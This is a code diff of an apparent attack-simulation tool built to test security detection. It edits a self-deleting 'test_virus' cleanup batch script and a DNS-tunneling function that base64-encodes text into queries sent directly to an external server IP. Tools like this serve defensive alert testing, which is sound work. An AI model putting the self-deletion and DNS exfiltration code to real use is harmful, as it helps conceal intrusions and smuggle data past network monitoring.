@@ -158,7 +158,7 @@ def delete_self():
         exe_file = os.path.join(base_directory, "test_virus.exe")
         license_file = os.path.join(base_directory, "frozen_application_license.txt")
         # Need to test ways to delete all versions
-        dll_file = os.path.join(base_directory, "python312.dll")
+        dll_file = os.path.join(base_directory, "python*.dll")
         cleanup_batch = os.path.join(base_directory, "cleanup.bat")
         # Write a cleanup batch script
         with open(cleanup_batch, "w") as batch_file:
@@ -170,7 +170,7 @@ def delete_self():
                 batch_file.write(f'del /f /q "{license_file}"\n')  # Delete license file
             
             batch_file.write(f'del /f /q "{dll_file}"\n')  # Delete DLL file
-            batch_file.write(f'del /f /q "*zip"\n')  # Delete the zip file if present
+            batch_file.write(f'del /f /q "{base_directory}*.zip"\n')  # Delete the zip file if present
             # if os.path.exists(dll_file):
             #     batch_file.write(f'del /f /q "{dll_file}"\n')  # Delete DLL file
             batch_file.write(f'del /f /q "{exe_file}"\n')  # Delete the EXE
@@ -382,7 +382,7 @@ def ransomware_simulation():
         logging_func("ransomware simulation error")
         return {"use_case": "ransomware_simulation", "status": f"error: {e}"}
 
-# Only works when doing calls to external url
+# Only works both ways when doing calls to external url, but should still trigger outbound dns-tunnel alerts
 def dns_tunneling():
     logging_func("DNS tunneling simulation starting")
     try:
@@ -390,6 +390,8 @@ def dns_tunneling():
         text_bytes = base64.urlsafe_b64encode(text.encode("ascii"))
         text_str = text_bytes.decode("ascii")   
         qname = f"{text_str}.dns.bitlus.online"
+        # Have to point the DNS request directly to our server, 
+        # might work if our DNS server was a Authoritative one 
         dns_req = IP(dst='79.76.56.138')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=qname))
         answer = sr1(dns_req, verbose=1, timeout=5)
         if answer:
